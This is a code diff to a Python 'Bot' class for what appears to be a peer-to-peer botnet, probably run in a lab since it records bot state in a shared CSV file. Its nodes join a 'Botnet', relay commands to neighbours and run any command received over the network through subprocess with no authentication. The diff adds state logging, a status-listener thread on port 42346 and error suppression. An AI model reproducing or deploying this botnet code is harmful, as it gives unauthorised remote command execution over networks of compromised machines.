@@ -1,7 +1,10 @@
 from subprocess import call,  CalledProcessError
 import socket
 import _thread
-
+import os
+import csv
+import pandas as pd 
+import lockfile
 
 class Bot:
 
@@ -13,7 +16,16 @@ class Bot:
         self.lastCmd = set()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.bind(('', self.port))
-
+        if not os.path.isfile("./host-share/bots.csv"):
+            with open ("./host-share/bots.csv", 'w') as bots:
+                writerB = csv.writer(bots)
+                writerB.writerow(['ip_addr', 'state','neighbors', 'lastCMD'])
+                bots.close()
+        with open("./host-share/bots.csv", 'a') as bots:
+            ip = socket.gethostbyname(socket.gethostname())
+            writerB = csv.writer(bots)
+            neighbors = []
+            writerB.writerow([ip, 'asleep', "[]", None])
 
     def sleep(self):
         s = self.connection
@@ -39,6 +51,18 @@ class Bot:
                     pass
 
 
+    def list_back(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('', 42346))
+        while True:
+            s.listen()
+            conn, addr = s.accept()
+            with conn:
+                data = conn.recv(1024)
+                if data.decode() == "Update Request":
+                    conn.send(str(self.isAsleep).encode())
+
+    
     def listen(self):
         s = self.connection
         s.listen()
@@ -69,11 +93,18 @@ class Bot:
                     exit(1)
                 elif data.decode() == "New Bot joining Botnet":
                     self.Neighbors[conn.getpeername()[0]] = 1
+                    #df = pd.read_csv("./host-share/bots.csv")
+                    #ip_addr = socket.gethostbyname(socket.gethostname())
+                    #df.loc[df['ip_addr']==ip_addr, ['neighbors']] = str(list(self.Neighbors.keys()))
+                    #df.to_csv("./host-share/bots.csv", index=False)
                     answer = "Welcome from {}".format(conn.getsockname()[0])
                     conn.send(answer.encode())
                 elif data.decode() == "Update Request":
                     conn.send(str(self.isAsleep).encode())
                 elif data.decode() == "Show Neighbors":
+                    #if not self.Neighbors:
+                    #    conn.send("[]".encode())
+                    #else:
                     conn.send(str(list(self.Neighbors.keys())).encode())
 
 
@@ -86,11 +117,13 @@ class Bot:
 
     def sendCmd(self, cmd, host):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            if self.Neighbors[host] == 1:
-                s.connect((host, self.port))
-                s.sendall(cmd.encode())
-            s.close()
-
+            try:
+                if self.Neighbors[host] == 1:
+                    s.connect((host, self.port))
+                    s.sendall(cmd.encode())
+                s.close()
+            except OSError or socket.error or ConnectionRefusedError or ConnectionError as e:
+                pass
 
     def join_botnet(self, neighbors):
         for host in neighbors:
@@ -106,12 +139,24 @@ class Bot:
             print(response.decode())
             if response.decode() == "Welcome from {}".format(host):
                 self.Neighbors[host] = 1
-
+                #df = pd.read_csv("./host-share/bots.csv")
+                #ip_addr = socket.gethostbyname(socket.gethostname())
+                #df.loc[df['ip_addr']==ip_addr, ['neighbors']] = str(list(self.Neighbors.keys()))
+                #df.to_csv("./host-share/bots.csv", index=False)
+                
+                #print(listNeighbors)
+                #print(type(list(df.loc[df['ip_addr']==ip_addr, ['neighbors']])))
+                #list(dataframe.at[ip_addr, 'neighbors']).append(host)
 
 
     @staticmethod
     def __executeCmd(cmd):
         print(cmd)
+        ip_addr = socket.gethostbyname(socket.gethostname())
+        with lockfile.LockFile("./host-share/bots.csv"):
+            df = pd.read_csv("./host-share/bots.csv")
+            df.loc[df['ip_addr']==ip_addr, ['lastCMD']] = cmd
+            df.to_csv("./host-share/bots.csv", index=False)
         try:
             call(cmd)
         except CalledProcessError as e:
@@ -125,6 +170,7 @@ class Bot:
 
 def main():
     bot = Bot()
+    _thread.start_new_thread(bot.list_back, ())
     while True:
         while bot.isAsleep:
             bot.sleep()
@@ -133,3 +179,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
